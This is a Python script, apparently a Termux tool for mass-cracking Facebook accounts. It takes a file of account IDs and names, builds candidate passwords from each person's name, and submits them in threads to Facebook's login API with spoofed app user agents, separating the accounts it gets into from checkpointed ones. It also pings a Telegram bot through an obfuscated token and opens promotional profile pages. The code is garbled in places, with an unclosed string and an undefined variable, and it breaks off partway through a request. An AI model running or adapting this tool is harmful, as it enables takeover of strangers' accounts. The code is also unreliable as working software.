
A='.DEVIL'
import os, sys, base64 as B
C='import os
import sys
import time
import random
from concurrent.futures import ThreadPoolExecutor
import requests
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys,uuid,getpass
import os,base64,zlib,pip,urllib
import os,zlib,time,datetime
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from time import localtime as lt
import os
import requests
import httpx
import os
import os,zlib
from time import localtime as lt
from os import system as osRUB
from os import system as cmd
from io import BytesIO
try:
    import pycurl
except ModuleNotFoundError:
    os.system("pip install pycurl")
os.system('clear')
try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
    os.system('pip install requests')
    os.system('xdg-open https://www.facebook.com/profile.php?id=61574890617831')
try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')    
    os.system('xdg-open https://www.facebook.com/profile.php?id=61574890617831')
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as MrXIDI
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
import requests,bs4,json,os,sys,random,datetime,time,re,string
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
#==================[PERMISSION]==================#
try:
    os.listdir("/sdcard")
except:
    os.system("clear")
    #sys.exit(f"\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m PLEASE GIVE STORAGE PERMISSION ")
#==================[COLOUR]==================#
R = '\033[1;91m'
W = '\033[1;97m'
G = '\033[1;32m'
Y = '\033[1;33m'
B = '\x1b[38;5;46m'
#==================[LOOP]==================#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[];cid=[];plist=[]
#==================[UA-BOX]====================#
#==================[FILE-M-1]====================#
def f1():
    mcc = random.choice([
        'M2101K6G', 'M2101K6R', 'M2101K6P', 'M2102J20SG', 'M2007J20CG',
        'M2007J20CT', 'M2007J3SY', 'M2007J3SP', 'M2007J3SG', 'M2007J17C',
        'M2010J19CG', 'M2010J19SG', 'M2010J19SI', 'M2010J19SL', 'M2010J19SY',
        'M2012K11AG', 'M2012K11AI', 'M2012K11C', 'M2012K11G', 'M2012K11I',
        'M2012K11R', 'M2101K7AG', 'M2101K7AI', 'M2101K7BG', 'M2101K7BI',
        'M2101K7BL', 'M2101K7BN', 'M2101K7BY', 'M2101K7C', 'M2101K7G',
        'M2101K7I', 'M2101K7R', 'M2101K7Y', 'M2102K1AC', 'M2102K1C',
        'M2102K1G', 'M2103K19G', 'M2103K19I', 'M2103K19Y', 'M2104K10AC',
        'M2104K10I', 'M2104K10AG', 'M2104K10AI', 'M2104K10C', 'M2104K10G',
        'M2104K10I', 'M2104K10R', 'M2104K10Y', 'M2105K81AC', 'M2105K81C',
        'M2105K81G', 'M2105K81I', 'M2105K81R', 'M2105K81Y',]) 
    url1 = f'[FBAN/FB4A;FBAV/{random.randint(123, 9999)}.0.0.{random.randint(1111, 9999)};FBBV/{random.randint(1111111, 9999999)};FBDM/{{density=2.0,width=720,height=1440}};FBLC/fr_LY;FBRV/{random.randint(111111111, 666666666)};FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{mcc};FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    return url1
#==================[FILE-M-2]====================#
def f2():
        url3  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'Dalvik/2.1.0 (Linux; U; Android 12; XQ-DC72 Build/RP1A.210705.001) [FBAN/FB4A;FBAV/421.0.0.79.58;FBBV/3559290;FBDM/{density=2.25,width=720,height=1600};FBLC/en_US;FBRV/5225365;FBCR/Orange;FBMF/Sony;FBBD/XQ-DC72;FBPN/com.facebook.katana;FBDV/XQ-DC72;FBSV/12;FBOP/3;FBCA/arm64-v8a]" 
        return url3
#==================[FILE-M-3]====================#  
def f3():
    opp = random.choice([ 
    'CPH2173', 'CPH2207', 'CPH2219', 'CPH2237', 'CPH2241',
    'CPH2251', 'CPH2263', 'CPH2273', 'CPH2285', 'CPH2293',
    'CPH2303', 'CPH2305', 'CPH2321', 'CPH2325', 'CPH2333',
    'CPH2341', 'CPH2343', 'CPH2353', 'CPH2357', 'CPH2365',
    'CPH2371', 'CPH2377', 'CPH2381', 'CPH2385', 'CPH2387',
    'CPH2391', 'CPH2395', 'CPH2397', 'CPH2399', 'CPH2401',
    'CPH2405', 'CPH2407', 'CPH2409', 'CPH2411', 'CPH2413',
    'CPH2415', 'CPH2417', 'CPH2419', 'CPH2421', 'CPH2423',
    'CPH2425', 'CPH2427', 'CPH2429', 'CPH2431', 'CPH2433',
    'CPH2435', 'CPH2437', 'CPH2439', 'CPH2441', 'CPH2443',]) 
    url4 = "[FBAN/FB4A;FBAV/110.0.0.17.29;FBBV/253687513;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/356894217;FBCR/MTS RUS;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/"+oppo+";FBSV/10;FBOP/1;FBCA/arm64-v8a:armeabi;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;]"
    return url4
#==================[FILE-M-4]====================#
def f4():
    huawei_models =([
        'LIO-L29', 'ELE-L29', 'VOG-L29', 'MAR-LX1A', 'ANA-NX9',
        'JNY-LX1', 'YAL-L21', 'YAL-L41', 'CDY-NX9', 'ELS-NX9',
        'POT-LX1', 'JAT-LX1', 'JAT-L29', 'JKM-LX1', 'JKM-LX2',
        'JEF-NX9', 'JEF-N29', 'JSC-LX2', 'JSC-LX1', 'JLN-LX1',
        'JLN-L21', 'JDN2-LX9', 'JMM-LX1', 'JMM-LX2', 'JAT-LX3',
        'JAT-L41', 'JAT-LX2', 'JNY-L21', 'JNY-LX2', 'JNY-L22',
        'JNY-L02', 'JNY-L42', 'JNY-L52', 'JNY-L62', 'JNY-L72',
        'JNY-L82', 'JNY-L92', 'JNY-LA1', 'JNY-LB1', 'JNY-LC1',
        'JNY-LD1', 'JNY-LE1', 'JNY-LF1', 'JNY-LG1', 'JNY-LH1',
        'JNY-LJ1', 'JNY-LK1', 'JNY-LL1', 'JNY-LM1', 'JNY-LN1'])
    
    user_agent = f'[FBAN/FB4A;FBAV/{random.randint(111, 999)}.0.0.{random.randint(1111, 9999)};' \
                 f'FBBV/{random.randint(1111111, 9999999)};' \
                 f'FBDM/{{density=2.0,width=1080,height=2400}};' \
                 f'FBLC/sw_KE;FBRV/{random.randint(111111111, 666666666)};' \
                 f'FBCR/Google Fi;FBMF/huawei;FBBD/huawei;' \
                 f'FBPN/com.facebook.orca;FBDV/{random.choice(huawei_models)};' \
                 f'FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    
    return user_agent
def generate_facebook_user2_agent(version_range=(80, 120)):
    fb_versions = [
        f"FBAV/{random.randint(*version_range)}.0.0.{random.randint(1, 200)}.{random.randint(1, 20)}"
    ]
    android_versions = ['4.2.2', '4.4.2', '5.1.1', '6.0.1', '7.0', '8.1.0', '9', '10', '11', '12', '13']
    brands_devices = {
        "Samsung": ["SM-G973F", "SM-A528B", "SM-A127F", "SM-N975F"],
        "Xiaomi": ["Mi 9T", "Redmi Note 9", "Redmi Note 7 Pro", "Poco X3 NFC"],
        "Huawei": ["P30 Pro", "Mate 20 Pro", "Nova 5T", "P40 Pro"],
        "OPPO": ["CPH2147", "CPH2127", "CPH2099", "CPH2171"],
        "Vivo": ["V2027", "V2007", "V2010", "V2026"],
        "LG": ["LM-G820", "LM-Q710", "LM-K500", "LM-X410"],
        "Sony": ["Xperia 10", "Xperia 1 II", "Xperia 5 II", "Xperia 10 IV"],
        "Motorola": ["Moto G Stylus", "Moto G Power", "Moto G Fast", "Moto G"],
        "Google": ["Pixel 6", "Pixel 6 Pro", "Pixel 5", "Pixel 4a"],
        "ASUS": ["ASUS_Z008", "ASUS_Z010", "ASUS_Z012", "ASUS_Z017"]
    }
    locales = ['en_US', 'es_ES', 'fr_FR', 'de_DE', 'pt_BR', 'it_IT']
    fbcr_values = ['Telecom', 'Vodafone', 'Orange', 'O2', 'T-Mobile', 'Verizon']
    dalvik_versions = ['1.6.0', '1.8.0', '2.1.0']

    fb_version = random.choice(fb_versions)
    android_version = random.choice(android_versions)
    brand = random.choice(list(brands_devices.keys()))
    device = random.choice(brands_devices[brand])
    locale = random.choice(locales)
    fbcr = random.choice(fbcr_values)
    dalvik_version = random.choice(dalvik_versions)
    width = random.randint(360, 1080)
    height = random.randint(640, 1920)
    build_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    ua_parts = [
        f"Dalvik/{dalvik_version}",
        f"(Linux; U; Android {android_version}; {device} Build/{build_id})",
        "[FBAN/FB4A;",
        f"{fb_version};",
        f"FBBV/{random.randint(100000000, 999999999)};",
        f"FBMD/{device};",
        f"FBSV/{android_version};",
        f"FBLC/{locale};",
        f"FBRV/{random.randint(1, 10000000)};",
        f"FBCR/{fbcr};",
        f"FBMF/{brand};",
        f"FBBD/{brand};",
        f"FBDV/{device};",
        f"FBSB/1;",
        f"FBOP/1;",
        f"FBCA/armeabi-v7a:armeabi]",
    ]
    return " ".join(ua_parts)
def UA():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/Orca-Android;FBAV/420.0.0.27.71;FBPN/com.facebook.orca;FBLC/en_US;FBBV/123456789;FBCR/Verizon;FBMF/Google;FBBD/Google;FBDV/Pixel 7;FBSV/14;FBCA/arm64-v8a:armeabi;FBDM/{density=3.0,width=1080,height=2400};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/450.0.0.70.65;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/170007000;FBCR/Movistar;FBMF/Huawei;FBBD/Huawei;FBDV/P60 Pro;FBSV/13;FBCA/arm64-v8a:armeabi;FBDM/{density=2.75,width=1224,height=2600};FB_FW/1;]"
    c = ";[FBAN/Orca-Android;FBAV/432.0.0.55.110;FBPN/com.facebook.orca;FBLC/ar_EG;FBBV/150000500;FBCR/Vodafone;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 12 Pro;FBSV/13;FBCA/arm64-v8a:armeabi;FBDM/{density=2.75,width=1080,height=2400};FB_FW/1;]"
    d = ";[FBAN/Orca-Android;FBAV/440.0.0.60.90;FBPN/com.facebook.orca;FBLC/en_US;FBBV/160005000;FBCR/T-Mobile;FBMF/Google;FBBD/Google;FBDV/Pixel 8;FBSV/14;FBCA/arm64-v8a:armeabi;FBDM/{density=3.0,width=1080,height=2400};FB_FW/1;]"
    ua = a+b+c+d
    return ua
#==================[FUNCTIONS]==================#
#token = '7534139444:AAEBv8dIG7lBwNMEFNTPLkAMFOC8ds2Qwi4'
#ID = '6511441369'
#message = "VEUX  8.0"
#requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={message}')
token = ''
token += '7'
token += '6'
token += '7'
token += '3'
token += '5'
token += '6'
token += '8'
token += '1'
token += '8'
token += '2'
token += ':'
token += 'A'
token += 'A'
token += 'H'
token += '8'
token += 'y'
token += 'i'
token += 'S'
token += 'a'
token += 'l'
token += 'I'
token += 'A'
token += 'U'
token += 'E'
token += 'N'
token += 'D'
token += 'V'
token += 'E'
token += 'a'
token += 'y'
token += 'M'
token += 'u'
token += '_'
token += 'v'
token += 'X'
token += '9'
token += 'L'
token += 'Y'
token += 'q'
token += 'v'
token += 'P'
token += '6'
token += 'g'
token += 'c'
token += 'M'
token += 'g'
ID = ''
ID += '5'
ID += '3'
ID += '6'
ID += '3'
ID += '4'
ID += '2'
ID += '3'
ID += '2'
ID += '0'
ID += '7'
message = "VENOM  1.0⩔⨳ VEUX "
requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={message}')
def clear():
    os.system("clear")
    print(logo)
def linex():
    print('\033[1;37m}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━✦ \x1b[1;97m')
def animation(u):
    for e in u + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
def m2():
    return "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/11.0.0.77.93;FBBV/61279955;FBDM/{density=2.7,width=1440,height=2560};FBLC/en_US;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920W8;FBSV/8.0;nullFBCA/armeabi-v7a:armeabi;]"
os.system("clear")
sim = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').replace('\n', '').replace(',', ' ➤ \x1b[1;92m')
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';SX = "{A}({R}+{A}) {A}"

orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
my_color = [white,blue,green];warna = random.choice(my_color)
logo=(f"""
\033[1;32m d888b  d888888b  .d8b.  
\033[1;32m88' Y8b `~~88~~' d8' `8b 
\033[1;32m88         88    88ooo88 
\033[1;32m88  ooo    88    88~~~88 
\033[1;32m88. ~8~    88    88   88 
\033[1;32m Y888P     YP    YP   YP 
\033[97;1m══════════════════════════════════════════════
\033[1;31m[\033[1;31m•\033[1;31m] \033[1;37m𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : \033[1;37mMX
\033[1;31m[\033[1;31m•\033[1;31m] \033[1;37m𝐆𝐈𝐓𝐇𝗨𝐁    : \033[1;37mMOHA-T-S
\033[1;31m[\033[1;31m•\033[1;31m] \033[1;37m𝐒𝐓𝐀𝐓𝗨𝐒    : \033[1;37mFREE
\033[1;31m[\033[1;31m•\033[1;31m] \033[1;37m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   : \033[1;32m1.0
\033[1;31m[\033[1;31m•\033[1;31m] \033[1;37m𝐓𝐎𝐎𝐋      : \033[1;37mFILE CLONE
{R}✦{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}✦   
 {white}[{red}◆{white}] {green}KEY{white} ▶︎f465f09f-ce57-4d2a-bffa-e191b93ad3a5
{R}✦{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#==================[MENU]==================#
def key():
    uID = hashlib.md5((platform.version() + str(os.getuid()) + platform.platform() + os.getlogin() + platform.release()).replace(' ', '').encode()).hexdigest()
    return uID.upper()
kfeyx = key()
os.system('xdg-open https://www.facebook.com/venom.dz.03')
def mmk():
    clear()
    print(f'{A}({R}1{A}) {A}FILE CLONING ');print(f'{A}({R}0{A}) {A}EXIT ')
    linex()
    xd=input(f'{A}({R}+{A}) {A}CHOICE   {R}:{A} ')
    if xd in ['1','01']:
        mmku()
    else:
        os.system("clear")
        #print("\033[1;97m\033[1;92m\033[1;97m\033[1;92m TOOLS EXITED DONE")
#==================[FILE]==================#
def mmku():
    clear()
    print(f'{A}({R}+{A}) {A}EXAMPLE  {R}: {A}/sdcard/filename.txt ')
    linex()
    file = input(f'{A}({R}+{A}) {A}INPUT    {R}:{A} ')
    
    try:
        fo = open(file, 'r').read().splitlines()
    except FileNotFoundError:
        print(f'\033[1;37m\033[1;31m\033[1;37m\033[1;32m WRITE CORRECT PATH')
        time.sleep(1)
        mmku()
    
    clear()
    print(f'({A}1) METHOD ({A}M1)-(NEW)')
    print(f'({A}2) METHOD ({A}M2)-(MIX)')
    print(f'({A}2) METHOD ({A}M3)-(MIX/NEW)')
    print(f'({A}4) METHOD ({A}M4)-(MIX/NEW)')
    linex()
    mth = input(f"\033[1;97m✦\033[1;92m✦✦\033[1;97m✦✦\033[1;92m CHOICE {R}  ✦ {G}")    
    clear()
    print(f'{A}({R}+{A}) {A} AUTO PASSWORD')
    print(f'{A}({R}+{A}) {A} LINI PASSWORD')
    linex()
    
    psw = input(f"\033[1;97m✦✦\033[1;92m✦✦\033[1;97m✦✦\033[1;92m CHOICE {R}  ✦✦ {G}")
    
    if psw in ['1', '01']:
       plist.append('first last')       
       plist.append('first12345')
       plist.append('first first')
       plist.append('last last') 
       plist.append('last first') 
       plist.append('firstfirst') 
       plist.append('firstlast') 
       plist.append('lastlast') 
       plist.append('lastfirst') 
       plist.append('firstfirst123')
       plist.append('firstlast123') 
       plist.append('lastlast123') 
       plist.append('first123') 
       plist.append('last123') 
       plist.append('first1234') 
       plist.append('first12345') 
       plist.append('firstlast12345') 
       plist.append('first123456') 
       plist.append('first123456789')
       plist.append('last123') 
       plist.append('last1234')                   
       plist.append('@@first@@')
       plist.append('last12345')
       plist.append('first@@@')
       plist.append('first0')
       plist.append('first1')
       plist.append('first123456789')
       plist.append('first2020')
       plist.append('first2021')
       plist.append('first2022')
       plist.append('first2023')
       plist.append('first2000')
       plist.append('first2001')
       plist.append('first2002')
       plist.append('first123123')
       plist.append('first@123')
       plist.append('first@last')      
       plist.append('first2003')
       plist.append('first2004')
       plist.append('first2005')       
       plist.append('first2006')
       plist.append('last2004')
       plist.append('first 2002') 
       plist.append('first@@@')
       plist.append('first@@@first') 
    else:
        try:
            clear()
            ps_limit = int(input(f'{A}({R}1{A}) {A}PASSWORD LIMIT : '))
        except ValueError:
            ps_limit = 1
        for i in range(ps_limit):
           plist.append(input(f'{A}({R}+{A}) {A}PASSWORD NO {i+1} {R}: {A} '))
    
    clear()
    cx = input(f'{A}({R}+{A}) {A}DO YOU WENT SHOW CP ACCOUNT : {R}({A}Y{R}/{A}N{R})').lower()
    if cx in ['y', 'yes']:
        pcp.append('y')
    else:
        pcp.append('n')
    with ThreadPoolExecutor(max_workers=30) as crack_submit:
        clear()
        total_ids = len(fo)
        #print(f'{A}({R}+{A}) TOTAL ID {A}({R}+{A})  {total_ids}')
        #ipinfo = requests.get('http://ip-api.com/json/') 
        #z = json.loads(ipinfo.text) 
        #regi = z['regionName'] 
        #network = z['isp'] 
        ip = requests.get('https://api.ipify.org').text.strip() 
        #loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()    
        print(f'{A}({R}+{A})  TOTAL ID {A}({R}+{A})  {total_ids}')     
        print(f'{A}({R}+{A})  IP ADDRESS   : \033[1;32m'+ip+'       ') 
       # print(f'{A}({R}+{A})  COUNTRY      : \033[1;32m'+loc+'       ') 
       # print(f'{A}({R}+{A})  REGION        : \033[1;32m'+regi+'       ') 
       # print(f'{A}({R}+{A})  NETWORK      : \033[1;32m'+network+'       ') 
        print(f"{A}({R}+{A})  SIM            : {sim}")
        #print(f'{A}({R}+{A})  CHOICE NAME  : \033[1;32m'+first+''+last+'.xx'+domain+'') 
        print(f'{A}({R}+{A})  If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!')
        linex()
        
        for user in fo:
            ids, names = user.split('|', 1)
            passlist = plist
            if mth == '1':
                crack_submit.submit(graph,ids,names,passlist)
            elif mth == '2':
                crack_submit.submit(graph2,ids,names,passlist)
            elif mth == '3':
                crack_submit.submit(graph3,ids,names,passlist)
            elif mth == '4':
                crack_submit.submit(graph4,ids,names,passlist)   
     #print('\033[1;37m')
     #print(f'{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤ ')
   #  print(f'{A}({R}+{A}) {A} THE PROCESS HAS COMPLETED')
#     print(f'{A}({R}+{A}) {A} TOTAL OK/CP : '+str(len(oks))+'\n'f'{A}({R}+{A}) {A} TOTAL CP : '+str(len(cps)))
  #   print(f'{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤ ')
   #  input(f'{A}({R}+{A}) {A} PRESS ENTER TO BACK ')
#==================[M1]==================#
def graph(ids,names,passlist):
    global oks,loop,sim_id,device
    sys.stdout.write(f'\r\r{R}({A}VEUX-XD{R}) {R}- {R}({A}METHOD-M1{R}) {R}- {R}({A}%s{R}) {R}- {R}({A}%s{R}) {R}- {R}({A}%s{R}) '%(loop,len(oks),len(cps)));sys.stdout.flush()
    #ua = 'Dalvik/2.1.0 (Linux; U; Android 12.0; Sony Xperia 10 V Build/RP1A.210705.244)[FBAN/FB4A;FBAV/421.0.0.79.58;FBBV/3559290;FBDM/{density=2.0,width=720,height=1600};FBLC/en_US;FBRV/5225365;FBCR/STC;FBMF/Sony;FBBD/Sony Xperia 10 V;FBPN/com.facebook.katana;FBDV/Sony Xperia 10 V;FBSV/12.0;FBOP/3;FBCA/arm64-v8a]'+'Dalvik/2.1.0 (Linux; U; Android 13.0; Huawei P60 Pro Build/RP1A.230910.762)[FBAN/FB4A;FBAV/430.0.0.73.55;FBBV/3522222;FBDM/{density=3.5,width=1440,height=3200};FBLC/en_US;FBRV/5802877;FBCR/Zain;FBMF/Huawei;FBBD/Huawei P60 Pro;FBPN/com.facebook.katana;FBDV/Huawei P60 Pro;FBSV/13.0;FBOP/2;FBCA/armeabi-v7a]'+'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X656 Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/311.0.0.1.378;FBBV/434770443;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]'
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 11; ONEPLUS A6013 Build/RP1A.200720.011) [FBAN/FB4A;FBAV/385.0.0.25.110;FBBV/00000000;FBDM/{density=240,width=720,height=2340};FBLC/fr_FR;FBRV/0]','Dalvik/2.1.0 (Linux; U; Android 9; Moto G(9) Power Build/PQ2A.190405.003) [FBAN/FB4A;FBAV/390.0.0.34.101;FBBV/00000000;FBDM/{density=480,width=1080,height=2400};FBLC/ar_DZ;FBRV/0]','Dalvik/2.1.0 (Linux; U; Android 10; Pixel 4 Build/QP1A.190711.020) [FBAN/FB4A;FBAV/390.0.0.34.101;FBBV/00000000;FBDM/{density=440,width=1440,height=2340};FBLC/fr_FR;FBRV/0]','Dalvik/2.1.0 (Linux; U; Android 11; Moto G(9) Power Build/RP1A.200720.011) [FBAN/FB4A;FBAV/385.0.0.25.110;FBBV/00000000;FBDM/{density=240,width=1080,height=2400};FBLC/fr_FR;FBRV/0]','Dalvik/2.1.0 (Linux; U; Android 11; Moto G(9) Power Build/RP1A.200720.011) [FBAN/FB4A;FBAV/385.0.0.25.110;FBBV/00000000;FBDM/{density=440,width=1080,height=2400};FBLC/es_ES;FBRV/0]','Dalvik/2.1.0 (Linux; U; Android 7.1.1; SM-G973F Build/NMF26X) [FBAN/FB4A;FBAV/385.0.0.25.110;FBBV/00000000;FBDM/{density=320,width=1080,height=2400};FBLC/fr_FR;FBRV/0]','Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 9 Build/PQ2A.190405.003) [FBAN/FB4A;FBAV/385.0.0.25.110;FBBV/00000000;FBDM/{density=420,width=1080,height=1920};FBLC/ar_DZ;FBRV/0]','Dalvik/2.1.0 (Linux; U; Android 9; ONEPLUS A6013 Build/PQ2A.190405.003) [FBAN/FB4A;FBAV/390.0.0.34.101;FBBV/00000000;FBDM/{density=320,width=1080,height=1920};FBLC/fr_FR;FBRV/0]','Dalvik/1.8.0(Linux; U; Android 10.0;Xperia 5 II Build/3ZT39XLT)[FBAN/FB4A;FBAV/119.0.0.93.51FBBV/7484005FBDM/{density=3.0,width=783,height=1712}FBLC/ja_JPFBRV/3586961FBCR/AT&TFBMF/SonyFBBD/SonyFBPN/com.facebook.katanaFBDV/Xperia 5 IIFBSV/10.0FBOP/1FBCA/x86:armeabi-v7a]','Dalvik/1.6.0(Linux; U; Android 11.0;Xperia 10 Build/MFTX8N08)[FBAN/FB4A;FBAV/118.0.0.76.34FBBV/6552456FBDM/{density=3.0,width=600,height=1749}FBLC/pt_BRFBRV/7236425FBCR/TelecomFBMF/SonyFBBD/SonyFBPN/com.facebook.katanaFBDV/Xperia 10FBSV/11.0FBOP/1FBCA/x86:armeabi-v7a]','Dalvik/2.1.0 (Linux; U; Android 10; Moto G(9) Power Build/QP1A.190711.020) [FBAN/FB4A;FBAV/385.0.0.25.110;FBBV/00000000;FBDM/{density=420,width=1080,height=1920};FBLC/fr_FR;FBRV/0]','Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4 Build/TP1A.220624.014) [FBAN/FB4A;FBAV/385.0.0.25.110;FBBV/00000000;FBDM/{density=240,width=720,height=1920};FBLC/es_ES;FBRV/0]','Dalvik/2.1.0 (Linux; U; Android 9; SM-G973F Build/PQ2A.190405.003) [FBAN/FB4A;FBAV/404.0.0.22.90;FBBV/00000000;FBDM/{density=440,width=1080,height=1920};FBLC/en_US;FBRV/0]','Dalvik/2.1.0 (Linux; U; Android 8.0.0; VOG-L29 Build/OPR6.170623.017) [FBAN/FB4A;FBAV/385.0.0.25.110;FBBV/00000000;FBDM/{density=420,width=720,height=2400};FBLC/en_US;FBRV/0]','Dalvik/2.1.0 (Linux; U; Android 10; SM-G973F Build/QP1A.190711.020) [FBAN/FB4A;FBAV/385.0.0.25.110;FBBV/00000000;FBDM/{density=480,width=1080,height=2340};FBLC/es_ES;FBRV/0]"
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            li = ['28']
            li2 = random.choice(li)
            data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': 